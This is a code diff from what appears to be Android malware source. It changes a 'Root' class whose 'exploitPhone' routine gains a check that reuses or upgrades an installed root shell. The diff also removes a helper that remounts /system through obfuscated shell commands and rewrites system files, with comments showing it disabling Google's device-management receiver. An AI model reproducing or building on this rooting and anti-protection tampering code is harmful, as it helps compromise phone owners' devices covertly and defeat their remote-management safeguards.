@@ -101,7 +101,6 @@ public class Root {
 
 	static public boolean exploitPhone(boolean synchronous) {
 
-		// TODO: collassare exploitPhone con linuxExploit, spostanto i check delle versioni in checkFrama, checkSelinux, ecc..
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (exploitPhone) OS: " + android.os.Build.VERSION.SDK_INT);
 		}
@@ -109,6 +108,13 @@ public class Root {
 		if (PackageInfo.checkRoot()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(exploitPhone): root shell already installed, no need to exploit again");
+			}
+			Status.setExploitResult(Status.EXPLOIT_RESULT_NOTNEEDED);
+			Status.setExploitStatus(Status.EXPLOIT_STATUS_EXECUTED);
+			return false;
+		}else if(PackageInfo.upgradeRoot()){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(exploitPhone): root shell upgraded, no need to exploit again");
 			}
 			Status.setExploitResult(Status.EXPLOIT_RESULT_NOTNEEDED);
 			Status.setExploitStatus(Status.EXPLOIT_STATUS_EXECUTED);
@@ -218,116 +224,6 @@ public class Root {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (adjustOom): OOM Adjusted"); //$NON-NLS-1$
 		}
-	}
-
-	public static boolean replaceInFile(File fs, File tmpLocal,String matchRegExp,String replaceRegExp,String replace,Boolean isSystemWriting){
-		//examples:
-		// - to replace "com.google.android.gms/com.google.android.gms.mdm.receivers.MdmDeviceAdminReceiver"
-		//   in "com.google.android.gms/com.google.android.gms.mdm.receivers.Fuck"
-		//   matchRegExp = ".*MdmDeviceAdminReceiver.*"
-		//   replaceRegExp = "MdmDeviceAdminReceiver"
-		//   replace = "Fuck"
-		// - to delete "com.google.android.gms/com.google.android.gms.mdm.receivers.MdmDeviceAdminReceiver"
-		//   matchRegExp = ".*MdmDeviceAdminReceiver.*"
-		//   replaceRegExp = null
-		//   replace = null
-
-		Boolean matchFound=false;
-		Writer writer=null;
-		BufferedReader fileReader=null;
-		try {
-			fileReader = new BufferedReader(new InputStreamReader(new FileInputStream(fs.getAbsolutePath())));
-			if(tmpLocal.exists()){
-				tmpLocal.delete();
-			}
-			
-			writer = new BufferedWriter(new FileWriter(tmpLocal));
-			String lineContents ;
-			int offset=0;
-			Pattern pattern = Pattern.compile(matchRegExp);
-			while( (lineContents = fileReader.readLine()) != null)
-			{
-				Matcher matcher = pattern.matcher(lineContents);
-				String lineByLine = null;
-				if(matcher.matches())
-				{
-					if (Cfg.DEBUG) {
-						Check.log(TAG + "(replaceInFile): match'" + lineContents + "' line offsets:" + offset);
-					}
-					if(replace!=null){
-						lineByLine = lineContents.replaceAll((replaceRegExp!=null)?replaceRegExp:matchRegExp,replace);
-						if (Cfg.DEBUG) {
-							Check.log(TAG + "(replaceInFile): replaced with:'" + lineByLine + "'");
-						}
-						writer.write(lineByLine+"\n");
-					}else{
-						if (Cfg.DEBUG) {
-							Check.log(TAG + "(replaceInFile): deleted");
-						}
-					}
-					matchFound=true;
-
-				}else{
-					writer.write(lineContents+"\n");
-				}
-				offset += lineContents.length();
-			}
-			fileReader.close();
-			writer.close();
-			if(matchFound){
-				if(isSystemWriting) {
-					// Remount /system
-					Execute.execute(Configuration.shellFile + " " + M.e("blw"));
-				}
-				try {
-					FileChannel source = null;
-					FileChannel destination = null;
-					FileInputStream fsource = new FileInputStream(tmpLocal);
-					source = fsource.getChannel();
-					FileOutputStream fdestination = new FileOutputStream(fs);
-					destination = fdestination.getChannel();
-					destination.transferFrom(source, 0, source.size());
-					if (source != null) {
-						source.close();
-						fsource.close();
-					}
-					if (destination != null) {
-						destination.close();
-						fdestination.close();
-					}
-				} catch (IOException e) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (replaceInFile): trasferForm, error: " + e);
-					}
-					return false;
-				}
-				return true;
-			}
-		} catch (IOException e) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "(replaceInFile):openCopy, error: " + e);
-			}
-		}finally{
-			if(writer!=null){
-				try {
-					writer.close();
-				} catch (IOException e) {
-				}
-			}
-
-			if(fileReader!=null){
-				try {
-					fileReader.close();
-				} catch (IOException e) {
-				}
-			}
-
-			if(isSystemWriting){
-				// Return /system to normal
-				Execute.execute(Configuration.shellFile + " " + M.e("blr"));
-			}
-		}
-		return false;
 	}
 
 	static public boolean uninstallRoot() {
